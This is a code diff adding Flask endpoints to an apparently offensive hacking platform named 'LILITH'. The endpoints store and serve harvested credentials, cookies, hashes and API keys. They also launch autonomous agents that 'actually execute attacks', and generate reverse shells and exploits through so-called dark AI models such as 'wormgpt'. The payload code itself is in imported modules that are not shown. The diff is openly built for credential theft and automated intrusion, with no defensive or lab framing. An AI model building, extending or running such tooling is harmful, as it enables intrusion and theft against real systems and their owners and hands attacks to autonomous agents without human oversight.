@@ -4164,6 +4164,356 @@ def get_specific_exfil(technique: str):
         return jsonify({'success': False, 'error': str(e)})
 
 
+# =============================================================================
+# LOOT STORAGE API - All loot stored in LILITH's memory!
+# =============================================================================
+
+try:
+    from lilith_loot_storage import get_loot_storage
+    LOOT_STORAGE = get_loot_storage()
+except Exception as e:
+    print(f"[LILITH] Loot storage not available: {e}")
+    LOOT_STORAGE = None
+
+try:
+    from lilith_real_agents import create_hacking_buddy, create_autogpt, get_code_generator
+    REAL_AGENTS_AVAILABLE = True
+except Exception as e:
+    print(f"[LILITH] Real agents not available: {e}")
+    REAL_AGENTS_AVAILABLE = False
+
+
+@app.route('/loot/credentials', methods=['GET'])
+def get_loot_credentials():
+    """Get all harvested credentials from LILITH's memory"""
+    if not LOOT_STORAGE:
+        return jsonify({'success': False, 'error': 'Loot storage not available'})
+    
+    target = request.args.get('target')
+    cred_type = request.args.get('type')
+    limit = int(request.args.get('limit', 100))
+    
+    creds = LOOT_STORAGE.get_credentials(target=target, cred_type=cred_type, limit=limit)
+    return jsonify({
+        'success': True,
+        'count': len(creds),
+        'credentials': creds
+    })
+
+
+@app.route('/loot/credentials', methods=['POST'])
+def store_loot_credential():
+    """Manually store a credential"""
+    if not LOOT_STORAGE:
+        return jsonify({'success': False, 'error': 'Loot storage not available'})
+    
+    data = request.json
+    result = LOOT_STORAGE.store_credential(
+        username=data.get('username', ''),
+        password=data.get('password', ''),
+        target=data.get('target', 'manual'),
+        cred_type=data.get('type', 'password'),
+        source=data.get('source', 'manual'),
+        verified=data.get('verified', False)
+    )
+    return jsonify(result)
+
+
+@app.route('/loot/cookies', methods=['GET'])
+def get_loot_cookies():
+    """Get harvested cookies"""
+    if not LOOT_STORAGE:
+        return jsonify({'success': False, 'error': 'Loot storage not available'})
+    
+    domain = request.args.get('domain')
+    cookies = LOOT_STORAGE.get_cookies(domain=domain)
+    return jsonify({
+        'success': True,
+        'count': len(cookies),
+        'cookies': cookies
+    })
+
+
+@app.route('/loot/hashes', methods=['GET'])
+def get_loot_hashes():
+    """Get password hashes"""
+    if not LOOT_STORAGE:
+        return jsonify({'success': False, 'error': 'Loot storage not available'})
+    
+    hash_type = request.args.get('type')
+    hashes = LOOT_STORAGE.get_hashes(hash_type=hash_type)
+    return jsonify({
+        'success': True,
+        'count': len(hashes),
+        'hashes': hashes
+    })
+
+
+@app.route('/loot/keys', methods=['GET'])
+def get_loot_keys():
+    """Get API keys and secrets"""
+    if not LOOT_STORAGE:
+        return jsonify({'success': False, 'error': 'Loot storage not available'})
+    
+    key_type = request.args.get('type')
+    keys = LOOT_STORAGE.get_keys(key_type=key_type)
+    return jsonify({
+        'success': True,
+        'count': len(keys),
+        'keys': keys
+    })
+
+
+@app.route('/loot/stats', methods=['GET'])
+def get_loot_stats():
+    """Get loot statistics"""
+    if not LOOT_STORAGE:
+        return jsonify({'success': False, 'error': 'Loot storage not available'})
+    
+    stats = LOOT_STORAGE.get_loot_stats()
+    return jsonify({
+        'success': True,
+        'stats': stats
+    })
+
+
+@app.route('/loot/summary', methods=['GET'])
+def get_loot_summary():
+    """Get full loot summary"""
+    if not LOOT_STORAGE:
+        return jsonify({'success': False, 'error': 'Loot storage not available'})
+    
+    return jsonify(LOOT_STORAGE.get_all_loot_summary())
+
+
+# =============================================================================
+# SCRIPT STORAGE - Store scripts in LILITH's memory, NOT your local PC!
+# =============================================================================
+
+@app.route('/scripts', methods=['GET'])
+def get_scripts():
+    """Get all saved scripts from LILITH's memory"""
+    if not LOOT_STORAGE:
+        return jsonify({'success': False, 'error': 'Loot storage not available'})
+    
+    category = request.args.get('category')
+    language = request.args.get('language')
+    search = request.args.get('search')
+    
+    scripts = LOOT_STORAGE.get_scripts(
+        category=category,
+        language=language,
+        search=search
+    )
+    return jsonify({
+        'success': True,
+        'count': len(scripts),
+        'scripts': scripts
+    })
+
+
+@app.route('/scripts', methods=['POST'])
+def store_script():
+    """Store a script in LILITH's memory"""
+    if not LOOT_STORAGE:
+        return jsonify({'success': False, 'error': 'Loot storage not available'})
+    
+    data = request.json
+    result = LOOT_STORAGE.store_script(
+        name=data.get('name', f'script_{datetime.now().strftime("%Y%m%d_%H%M%S")}'),
+        code=data.get('code', ''),
+        language=data.get('language', 'python'),
+        category=data.get('category', 'general'),
+        description=data.get('description', ''),
+        tags=data.get('tags', [])
+    )
+    return jsonify(result)
+
+
+@app.route('/scripts/<name>', methods=['GET'])
+def get_script_by_name(name):
+    """Get a specific script by name"""
+    if not LOOT_STORAGE:
+        return jsonify({'success': False, 'error': 'Loot storage not available'})
+    
+    script = LOOT_STORAGE.get_script_by_name(name)
+    if script:
+        return jsonify({'success': True, 'script': script})
+    return jsonify({'success': False, 'error': 'Script not found'})
+
+
+@app.route('/scripts/<name>', methods=['DELETE'])
+def delete_script(name):
+    """Delete a script from memory"""
+    if not LOOT_STORAGE:
+        return jsonify({'success': False, 'error': 'Loot storage not available'})
+    
+    result = LOOT_STORAGE.delete_script(name)
+    return jsonify(result)
+
+
+# =============================================================================
+# REAL AUTONOMOUS AGENTS - Actually execute attacks!
+# =============================================================================
+
+@app.route('/agents/hackbuddy/real', methods=['POST'])
+def run_real_hackbuddy():
+    """Run REAL HackingBuddy attack - executes actual commands!"""
+    if not REAL_AGENTS_AVAILABLE:
+        return jsonify({'success': False, 'error': 'Real agents not available'})
+    
+    data = request.json
+    target = data.get('target', '127.0.0.1')
+    goal = data.get('goal', 'reconnaissance')
+    max_rounds = min(int(data.get('max_rounds', 5)), 20)
+    
+    agent = create_hacking_buddy(target, goal)
+    result = agent.run(max_rounds=max_rounds)
+    
+    return jsonify(result)
+
+
+@app.route('/agents/autogpt/real', methods=['POST'])
+def run_real_autogpt():
+    """Run REAL AutoGPT - autonomous attack planning and execution"""
+    if not REAL_AGENTS_AVAILABLE:
+        return jsonify({'success': False, 'error': 'Real agents not available'})
+    
+    data = request.json
+    objective = data.get('objective', 'Gather system information')
+    max_iterations = min(int(data.get('max_iterations', 5)), 10)
+    
+    agent = create_autogpt(objective)
+    result = agent.run(max_iterations=max_iterations)
+    
+    return jsonify(result)
+
+
+# =============================================================================
+# DARK CODE GENERATOR - Generate sophisticated code with dark AIs
+# =============================================================================
+
+@app.route('/codegen/generate', methods=['POST'])
+def generate_dark_code():
+    """Generate sophisticated code using dark AI models"""
+    if not REAL_AGENTS_AVAILABLE:
+        return jsonify({'success': False, 'error': 'Code generator not available'})
+    
+    data = request.json
+    codegen = get_code_generator()
+    
+    result = codegen.generate(
+        request=data.get('request', 'Python reverse shell'),
+        category=data.get('category', 'exploit'),
+        language=data.get('language', 'python'),
+        dark_model=data.get('model', 'wormgpt'),
+        save_to_memory=data.get('save_to_memory', True)
+    )
+    
+    return jsonify(result)
+
+
+@app.route('/codegen/reverse-shell', methods=['POST'])
+def generate_reverse_shell():
+    """Generate a reverse shell payload"""
+    if not REAL_AGENTS_AVAILABLE:
+        return jsonify({'success': False, 'error': 'Code generator not available'})
+    
+    data = request.json
+    codegen = get_code_generator()
+    
+    result = codegen.generate_reverse_shell(
+        lhost=data.get('lhost', '10.10.10.10'),
+        lport=int(data.get('lport', 4444)),
+        platform=data.get('platform', 'linux'),
+        encoded=data.get('encoded', False)
+    )
+    
+    return jsonify(result)
+
+
+@app.route('/codegen/exploit', methods=['POST'])
+def generate_exploit():
+    """Generate an exploit for a vulnerability"""
+    if not REAL_AGENTS_AVAILABLE:
+        return jsonify({'success': False, 'error': 'Code generator not available'})
+    
+    data = request.json
+    codegen = get_code_generator()
+    
+    result = codegen.generate_exploit(
+        vulnerability=data.get('vulnerability', 'SQL Injection'),
+        target_info=data.get('target_info', '')
+    )
+    
+    return jsonify(result)
+
+
+@app.route('/codegen/hypothesize', methods=['POST'])
+def hypothesize_attack():
+    """Use AI to hypothesize attack vectors"""
+    if not REAL_AGENTS_AVAILABLE:
+        return jsonify({'success': False, 'error': 'Code generator not available'})
+    
+    data = request.json
+    codegen = get_code_generator()
+    
+    result = codegen.hypothesize_attack(
+        target=data.get('target', ''),
+        known_info=data.get('known_info', '')
+    )
+    
+    return jsonify(result)
+
+
+# =============================================================================
+# TELEMETRY - Real-time attack monitoring
+# =============================================================================
+
+@app.route('/telemetry', methods=['GET'])
+def get_telemetry():
+    """Get real-time attack telemetry"""
+    if not LOOT_STORAGE:
+        return jsonify({'success': False, 'error': 'Telemetry not available'})
+    
+    event_type = request.args.get('type')
+    since_minutes = int(request.args.get('since', 60))
+    
+    telemetry = LOOT_STORAGE.get_telemetry(
+        event_type=event_type,
+        since_minutes=since_minutes
+    )
+    
+    return jsonify({
+        'success': True,
+        'count': len(telemetry),
+        'events': telemetry
+    })
+
+
+@app.route('/attack-results', methods=['GET'])
+def get_attack_results():
+    """Get attack results from loot storage"""
+    if not LOOT_STORAGE:
+        return jsonify({'success': False, 'error': 'Loot storage not available'})
+    
+    attack_type = request.args.get('type')
+    target = request.args.get('target')
+    success_only = request.args.get('success_only', 'false').lower() == 'true'
+    
+    results = LOOT_STORAGE.get_attack_results(
+        attack_type=attack_type,
+        target=target,
+        success_only=success_only
+    )
+    
+    return jsonify({
+        'success': True,
+        'count': len(results),
+        'results': results
+    })
+
+
 if __name__ == '__main__':
     # Get host from environment or use 0.0.0.0 to be accessible externally
     host = os.environ.get('BACKEND_HOST', '0.0.0.0')
